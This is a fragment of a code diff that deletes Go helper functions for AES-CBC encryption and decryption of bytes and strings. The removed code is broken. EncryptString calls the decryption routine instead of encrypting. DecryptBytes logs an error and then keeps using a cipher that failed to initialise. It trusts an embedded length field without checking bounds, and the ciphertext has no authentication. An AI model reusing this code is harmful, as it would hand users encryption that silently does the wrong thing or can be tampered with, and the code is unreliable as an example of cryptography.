-		appending := make([]byte, (16 - len(length_and_secret)%16))
-		corrected := append(length_and_secret, appending...)
-		length_and_secret = corrected
-	}
-
-	c := cipher.NewCBCEncrypter(cipher_block, IV)
-	encrypted := make([]byte, len(length_and_secret))
-	c.CryptBlocks(encrypted, length_and_secret)
-
-	return append(IV, encrypted...)
-}
-
-func DecryptBytes(encrypted_message []byte, key []byte) []byte {
-	IV := encrypted_message[0:16]
-
-	actual_ciphertext := encrypted_message[16:]
-
-	cipher_block, err := aes.NewCipher(key)
-	if err != nil {
-		println("Error occured, can't decrypt")
-	}
-	c := cipher.NewCBCDecrypter(cipher_block, IV)
-	decrypted := make([]byte, len(actual_ciphertext))
-	c.CryptBlocks(decrypted, actual_ciphertext)
-
-	length_bytes := decrypted[0:4]
-	length := binary.LittleEndian.Uint32(length_bytes)
-	decrypted = decrypted[4:]
-	return decrypted[:length]
-}
-
-func EncryptString(message string, key []byte) []byte {
-	return DecryptBytes([]byte(message), key)
-}
-
-func DecryptString(encrypted_message []byte, key []byte) string {
-	return string(DecryptBytes(encrypted_message, key))
 }
